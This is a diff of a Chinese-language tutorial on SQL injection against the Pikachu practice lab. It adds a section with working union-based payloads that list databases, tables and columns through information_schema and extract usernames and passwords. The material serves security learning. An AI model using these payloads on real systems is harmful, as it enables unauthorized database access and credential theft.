@@ -27,6 +27,7 @@
         - [xx型注入](#xx%E5%9E%8B%E6%B3%A8%E5%85%A5)
         - [案例1-基于union的信息获取](#%E6%A1%88%E4%BE%8B1-%E5%9F%BA%E4%BA%8Eunion%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
         - [mysql相关知识](#mysql%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86)
+        - [案例2-基于information_schema的信息获取](#%E6%A1%88%E4%BE%8B2-%E5%9F%BA%E4%BA%8Einformation_schema%E7%9A%84%E4%BF%A1%E6%81%AF%E8%8E%B7%E5%8F%96)
     - [相关链接](#%E7%9B%B8%E5%85%B3%E9%93%BE%E6%8E%A5)
 
 <!-- /TOC -->
@@ -254,9 +255,9 @@ if(isset($_GET['submit']) && $_GET['name']!=null){
 ```
 ```sql
 --正常情况
-select email from user where username = 'kobe';-- kobe' or 1=1#
+select email from users where username = 'kobe';-- kobe' or 1=1#
 --在url中构造闭合，注入
-select email from user where username = 'kobe' or 1=1#'
+select email from users where username = 'kobe' or 1=1#'
 ```
 
 ### 搜索型注入
@@ -288,9 +289,9 @@ if(isset($_GET['submit']) && $_GET['name']!=null){
 
 ```sql
 --正常情况
-select email from user where username like '%k%'; --k%' or 1=1#
+select email from users where username like '%k%'; --k%' or 1=1#
 --构造闭合，注入
-select email from user where username like '%k%' or 1=1#%';
+select email from users where username like '%k%' or 1=1#%';
 
 ```
 
@@ -319,9 +320,9 @@ if(isset($_GET['submit']) && $_GET['name']!=null){
 
 ```sql
 --正常情况
-select email from user where username = kobe;
+select email from users where username = kobe;
 --构造闭合，注入
-select email from user where username = 'kobe') or 1=1#;
+select email from users where username = 'kobe') or 1=1#;
 ```
 
 ```sql
@@ -338,27 +339,66 @@ kobe' and 1=2#;
 
 ### 案例1-基于union的信息获取
 ```sql
-select email from user where id = 1 union select database();
-select email from user where id = 1 union select user();
-select email from user where id = 1 union select version();
+select email from users where id = 1 union select database();
+select email from users where id = 1 union select user();
+select email from users where id = 1 union select version();
 --字符型sql注入闭合，先用order by判断字段数，假设为1
 xx' union select database();
 ```
 ### mysql相关知识
 ```sql
 --union用法，前后字段数一致
-select email from user where id = 1 union select 字段1 from 表名 where 条件;
+select email from users where id = 1
+ union 
+select 字段1 from 表名 where 条件;
 select database();--获取当前数据库名称
 select user();--当前用户权限
 select version();--当前数据库版本
 
+show databases;--查看所有数据库
+show tables;--查看所有表
+desc user;--查看user表所有字段
+use information_schema;--切换数据库
 --查询表中有几个字段
 ---使用第一列进行排序，如果第一列存在，则可以正常输出，否则错误
-select id from user where username = 'kobe' order by 1;
+select id from users where username = 'kobe' order by 1;
 
 ```
 
-mysql自带一个数据库information_schema，这个表非常重要，里面有很多信息。
+### 案例2-基于information_schema的信息获取
+mysql自带一个数据库 information_schema 表非常重要，里面有很多信息。
+```sql
+--获取当前数据库名称 pikachu 
+select email,username from users where id = 1
+ union
+select database(),user();
+----payload
+kobe' union select database(),user()#
+
+--获取表名 user
+select email,username from users where id = 1
+ union 
+select table_schema,table_name from information_schema.tables where table_schema = 'pikachu';
+---payload
+kobe' union select table_schema,table_name from information_schema.tables where table_schema = 'pikachu'#
+
+--获取字段名
+select email,username from users where id = 1
+ union 
+select table_name,column_name from information_schema.columns where table_name = 'users';
+---payload
+kobe' union select table_name,column_name from information_schema.columns where table_name = 'users'#
+
+--获取内容
+select email,username from users where id = 1
+ union 
+select username,password from users;
+---payload
+kobe' union select username,password from users#
+
+```
+
+
 
 
 ## 相关链接
